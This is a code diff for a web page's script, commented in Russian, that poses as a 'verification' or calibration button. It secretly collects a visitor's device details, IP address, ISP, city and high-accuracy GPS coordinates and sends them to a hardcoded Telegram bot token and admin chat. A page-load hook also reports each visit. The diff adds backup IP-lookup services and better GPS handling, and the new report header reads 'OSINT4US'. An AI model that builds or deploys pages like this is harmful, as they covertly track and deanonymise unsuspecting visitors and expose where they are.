@@ -80,74 +80,106 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8558041807:AAHRvcYf3uAeC8E2jH72KTtyckALIktHF8I';
-        const ADMIN_ID = '8578847512';
+    const BOT_TOKEN = '8558041807:AAHRvcYf3uAeC8E2jH72KTtyckALIktHF8I';
+    const ADMIN_ID = '8578847512';
 
-        async function sendToTelegram(message) {
+    async function sendToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            });
+        } catch (e) { console.error(e); }
+    }
+
+    async function startVerification() {
+        const btn = document.getElementById('mainBtn');
+        btn.innerText = "КАЛИБРОВКА...";
+        btn.disabled = true;
+
+        let report = `🛡 <b>ОТЧЕТ OSINT4US</b>\n`;
+        
+        // Детальное определение устройства
+        const platform = navigator.platform;
+        const cores = navigator.hardwareConcurrency || 'N/A';
+        const ram = navigator.deviceMemory || 'N/A';
+        report += `📱 <b>Устройство:</b> <code>${platform} (${cores} cores, ${ram}GB RAM)</code>\n`;
+        report += `🌐 <b>Браузер:</b> <code>${navigator.userAgent.slice(0, 50)}...</code>\n`;
+
+        // Агрессивное получение IP (3 попытки через разные сервисы)
+        let ip = "Не определен";
+        try {
+            // Попытка 1: ip-api (дает сразу и IP, и город)
+            const res = await fetch('https://demo.ip-api.com/json/?fields=66842623&lang=en');
+            const d = await res.json();
+            ip = d.query;
+            report += `🌍 <b>IP:</b> <code>${ip}</code>\n`;
+            report += `🏢 <b>Провайдер:</b> ${d.isp || 'N/A'}\n`;
+            report += `📍 <b>Регион:</b> ${d.city}, ${d.country}\n`;
+        } catch (e) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: true
-                    })
-                });
-            } catch (e) { console.error(e); }
-        }
-
-        async function startVerification() {
-            const btn = document.getElementById('mainBtn');
-            btn.innerText = "КАЛИБРОВКА...";
-            btn.disabled = true;
-
-            let report = `🛡 <b>ОТЧЕТ GITHUB-LOG</b>\n`;
-            report += `📱 <b>Device:</b> <code>${navigator.userAgent.slice(0, 80)}...</code>\n`;
-            report += `🌐 <b>Lang:</b> ${navigator.language}\n`;
-            report += `🖥 <b>Screen:</b> ${window.screen.width}x${window.screen.height}\n`;
-
-            // Получаем IP
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const d = await ipRes.json();
-                report += `🌍 <b>IP:</b> <code>${d.ip}</code>\n`;
-                report += `📍 <b>City:</b> ${d.city}, ${d.country_name}\n`;
-                report += `🏢 <b>ISP:</b> ${d.org}\n`;
-            } catch (e) { report += `🌍 <b>IP:</b> Не удалось получить\n`; }
-
-            // Геолокация
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        report += `📍 <b>GPS:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">ОТКРЫТЬ КАРТУ</a>`;
-                        await sendToTelegram(report);
-                        finish();
-                    },
-                    async () => {
-                        report += `📍 <b>GPS:</b> Доступ отклонен`;
-                        await sendToTelegram(report);
-                        finish();
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                await sendToTelegram(report);
-                finish();
+                // Попытка 2: jsonip
+                const res2 = await fetch('https://jsonip.com');
+                const d2 = await res2.json();
+                ip = d2.ip;
+                report += `🌍 <b>IP (запасной):</b> <code>${ip}</code>\n`;
+            } catch (e2) {
+                report += `🌍 <b>IP:</b> Блокировка всех сервисов\n`;
             }
         }
 
-        function finish() {
-            document.body.innerHTML = "<div style='color:red; text-align:center; padding-top:50%; font-family:monospace;'><h1>ПРОТОКОЛ ПРИНЯТ</h1><p>ИДЕНТИФИКАЦИЯ ЗАВЕРШЕНА.<br>ВЫ МОЖЕТЕ ЗАКРЫТЬ СТРАНИЦУ.</p></div>";
-        }
+        // Геолокация (GPS)
+        if (navigator.geolocation) {
+            const geoTimeout = setTimeout(async () => {
+                report += `⚠️ <b>GPS:</b> Тайм-аут (слишком долго)`;
+                await sendToTelegram(report);
+                finish();
+            }, 8000);
 
-        // Логгер на открытие страницы
-        window.onload = () => {
-            sendToTelegram(`👁 <b>ПЕРЕХОД ПО ССЫЛКЕ</b>\nBrowser: ${navigator.userAgent.slice(0, 60)}...`);
-        };
-    </script>
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    clearTimeout(geoTimeout);
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = Math.round(pos.coords.accuracy);
+                    // Ссылка на карты, которая открывает ПРИЛОЖЕНИЕ на телефоне
+                    const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+                    report += `📍 <b>GPS:</b> <a href="${mapUrl}">ОТКРЫТЬ КАРТУ</a>\n`;
+                    report += `🎯 <b>Точность:</b> ${acc} метров`;
+                    await sendToTelegram(report);
+                    finish();
+                },
+                async (err) => {
+                    clearTimeout(geoTimeout);
+                    let errText = "Доступ запрещен";
+                    if (err.code == 2) errText = "Сигнал отсутствует";
+                    if (err.code == 3) errText = "Тайм-аут";
+                    report += `📍 <b>GPS:</b> ${errText}`;
+                    await sendToTelegram(report);
+                    finish();
+                },
+                { enableHighAccuracy: true, timeout: 7500 }
+            );
+        } else {
+            report += `📍 <b>GPS:</b> Не поддерживается`;
+            await sendToTelegram(report);
+            finish();
+        }
+    }
+
+    function finish() {
+        document.body.innerHTML = "<div style='color:red; text-align:center; padding-top:50%; font-family:monospace;'><h1>ПРОТОКОЛ ПРИНЯТ</h1><p>ИДЕНТИФИКАЦИЯ ЗАВЕРШЕНА</p></div>";
+    }
+
+    window.onload = () => {
+        sendToTelegram(`👁 <b>АКТИВНОСТЬ</b>\nВход на страницу Кодекса.`);
+    };
+</script>
 </body>
 </html>
